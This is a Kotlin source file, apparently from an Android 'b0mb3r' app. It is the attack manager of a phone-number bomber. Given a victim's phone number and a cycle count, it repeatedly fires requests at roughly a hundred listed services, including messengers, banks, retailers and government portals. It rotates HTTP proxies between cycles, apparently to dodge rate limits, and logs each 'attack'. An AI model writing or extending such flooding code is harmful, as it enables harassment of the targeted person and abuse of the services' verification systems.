package kotleni.b0mb3r

import android.util.Log
import okhttp3.OkHttpClient.Builder
import okhttp3.Interceptor.Chain
import okhttp3.Request
import okhttp3.Response
import okhttp3.OkHttpClient
import okhttp3.Dispatcher
import kotleni.b0mb3r.AttackManager.Attack
import kotleni.b0mb3r.AttackManager
import kotleni.b0mb3r.services.*
import kotleni.b0mb3r.ui.main.MainActivity
import kotleni.b0mb3r.ui.main.MainRepository
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Interceptor
import java.io.IOException
import java.net.InetSocketAddress
import java.net.Proxy
import java.time.Duration
import java.util.ArrayList
import java.util.concurrent.CountDownLatch
import kotlin.Throws

class AttackManager(callback: Callback) {
    private val services: Array<Service>
    private var attack: Attack? = null
    private val callback: Callback
    private var ignoreCode = false

    fun performAttack(phoneCode: String, phone: String?, cycles: Int) {
        attack = Attack(phoneCode, phone, cycles)
        attack!!.start()
    }

    fun setIgnoreCode(status: Boolean) {
        ignoreCode = status
    }

    fun hasAttack(): Boolean {
        return attack != null && attack!!.isAlive
    }

    fun stopAttack() {
        attack!!.interrupt()
        Service.client.dispatcher.cancelAll()
    }

    fun getUsableServices(phoneCode: String): List<Service> {
        val usableServices: MutableList<Service> = ArrayList()
        for (service in services) {
            if (ignoreCode || service.requireCode == null || service.requireCode == phoneCode) usableServices.add(
                service
            )
        }
        return usableServices
    }

    interface Callback {
        fun onAttackEnd()
        fun onAttackStart(serviceCount: Int, numberOfCycles: Int)
        fun onProgressChange(progress: Int)
    }

    private inner class Attack(
        private val phoneCode: String,
        private val phone: String?,
        private val numberOfCycles: Int
    ) : Thread(
        phone
    ) {
        private var progress = 0
        private var tasks: CountDownLatch? = null
        override fun run() {
            val usableServices = getUsableServices(
                phoneCode
            )
            callback.onAttackStart(usableServices.size, numberOfCycles)
            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone))
            for (cycle in 0 until numberOfCycles) {
                updateClient()
                Log.i(TAG, String.format("Started cycle %s", cycle))
                tasks = CountDownLatch(usableServices.size)
                for (service in usableServices) {
                    service.prepare(phoneCode, phone)
                    service.run(object : okhttp3.Callback {
                        override fun onFailure(call: Call, e: IOException) {
                            Log.e(TAG, String.format("%s returned error", service.javaClass.name), e)
                            tasks!!.countDown()
                            callback.onProgressChange(progress++)
                        }

                        override fun onResponse(call: Call, response: Response) {
                            if (!response.isSuccessful) {
                                Log.i(TAG, String.format(
                                        "%s returned an error HTTP code: %s",
                                        service.javaClass.name, response.code)
                                )
                            }
                            tasks!!.countDown()
                            callback.onProgressChange(progress++)
                        }
                    })
                }
                try {
                    tasks!!.await()
                } catch (e: InterruptedException) {
                    break
                }
            }
            callback.onAttackEnd()
            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone))
        }
    }

    companion object {
        private const val TAG = "AttackManager"

        private var proxyId = 0
        fun updateClient() {
            val proxies = MainActivity.repository!!.getProxies()
            if(proxyId > proxies.size - 1) proxyId = 0

            Service.client = Builder().let {
                if(proxies.isNotEmpty()) {
                    val cur = proxies[proxyId]
                    it.proxy(Proxy(Proxy.Type.HTTP, InetSocketAddress(cur.ip, cur.port.toInt())))
                    println("Used proxy $cur")
                }

                it.addInterceptor(Interceptor { chain ->
                    val request = chain.request()
                    Log.v(Companion.TAG, String.format("Sending request %s", request.url))
                    val response = chain.proceed(request)
                    Log.v(Companion.TAG, String.format(
                        "Received response for %s with status code %s",
                        response.request.url, response.code
                    ))
                    return@Interceptor response
                })

                it.build()
            }

            proxyId += 1
        }
    }

    init {
        updateClient()
        this.callback = callback
        services = arrayOf(
            Kari(), Modulebank(), YandexEda(), ICQ(),
            Citilink(), GloriaJeans(), Alltime(), Mcdonalds(),
            Telegram(), AtPrime(), MTS(), CarSmile(),
            Sravni(), OK(), SushiWok(), Tele2(),
            Eldorado(), Tele2TV(), MegafonTV(), YotaTV(),
            Fivepost(), Askona(), FarforCall(), Sephora(),
            Ukrzoloto(), Olltv(), Wink(), Lenta(),
            Pyaterochka(), ProstoTV(), Multiplex(), RendezVous(),
            Zdravcity(), Robocredit(), Yandex(), MegafonBank(),
            VoprosRU(), InDriver(), Tinder(), Gosuslugi(),
            Hoff(), N1RU(), Samokat(), GreenBee(),
            ToGO(), Premier(), Gorparkovka(), Tinkoff(),
            MegaDisk(), KazanExpress(), BudZdorov(), FoodBand(),
            Benzuber(), Verniy(), Citimobil(), HHru(),
            Ozon(), Aushan(), Uber(), MFC(),
            Ostin(), EKA(), Neftm(), Plazius(),
            VKWorki(), Magnit(), SberZvuk(), Smotrim(),
            Mokka(), SimpleWine(), FarforSMS(), Stolichki(),
            BApteka(), HiceBank(), Evotor(), Sportmaster(),
            RiveGauche(), Yarche(), Baucenter(), Dolyame(),
            GoldApple(), FriendsClub(), ChestnyZnak(), DvaBerega(),
            MoeZdorovie(), Sokolov(), Boxberry(), Discord(),
            Privileges(), NearKitchen(), Citydrive(), BelkaCar(),
            Mozen(), MosMetro(), BCS(), Dostavista(),
            Metro(), Niyama(), RabotaRu(), Sunlight(),
            TikTok(), Zoloto585(), ABank24()
        )
    }
}